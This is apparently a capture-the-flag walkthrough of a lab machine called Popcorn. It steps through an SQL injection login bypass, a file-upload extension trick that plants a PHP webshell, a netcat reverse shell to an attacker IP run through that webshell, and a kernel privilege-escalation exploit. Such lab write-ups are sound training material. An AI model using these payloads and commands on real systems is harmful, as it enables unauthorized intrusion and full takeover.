#box #SQLi #file-upload #file-upload-bypass #webshell #ReverseShell #kernel-vulnerability #full-nelson
1. The machine presents port 22 and port 80 open. With a quick fuzzing of port 80 we discover the endpoint `/torrent`
2. After a brief reconnaissance we discover an Admin login, with a sample payload `' or 1=1 -- - ` we discover the login page is vulnerable to SQLi and manage to authenticate.
![[attachments/popcorn-1.png]]
3. Once authenticated, we manage to find two entrypoints where upload is possible. We cannot upload a torrent because there are some backend checks validating the file, but we notice that we can upload a screenshot to the already uploaded torrent. We proceed to upload a screenshot for the already existing torrent through `Browse -> Kali linux -> Edit this torrent -> Update screenshot` and intercept the API with BurpSuite. Once there, we simply update the extension to be `.php` instead of `.gif` and continue with the upload
![[attachments/popcorn-2.png]]
4. We then open the webshell by going back on the Kali Linux torrent detail page and by right clicking on the screenshot -> Open Link in New Tab
![[attachments/popcorn-3.png]]
5. Finally, this will lead us on the uploaded webshell file which has been uploaded with a GUID
![[attachments/popcorn-4.png]]
6. By adding `?cmd=id` we'll finally validate the webshell is working
![[attachments/popcorn-5.png]]
7. To obtain a shell, we'll run a reverse shell on port 3306 (we've noticed it was open by doing `netstat -ano` through the webshell) with `nc`
```sh
curl 'http://popcorn.htb/torrent/upload/723bc28f9b6f924cca68ccdff96b6190566ca6b4.php?cmd=nc%2010.10.14.194%203306%20-e%20/bin/bash
```
8. Once on the machine, after various tests and check, we run `Linpeas` discovering the machine is highly probable vulnerable to a kernel vulnerability named `full-nelson` (https://www.exploit-db.com/exploits/15704). We download the `C` script, build it on the target machine and finally run it, obtaining a `root` shell.
```c
gcc full-nelson.c -o full-nelson
./full-nelson
```

![[attachments/popcorn-6.png]]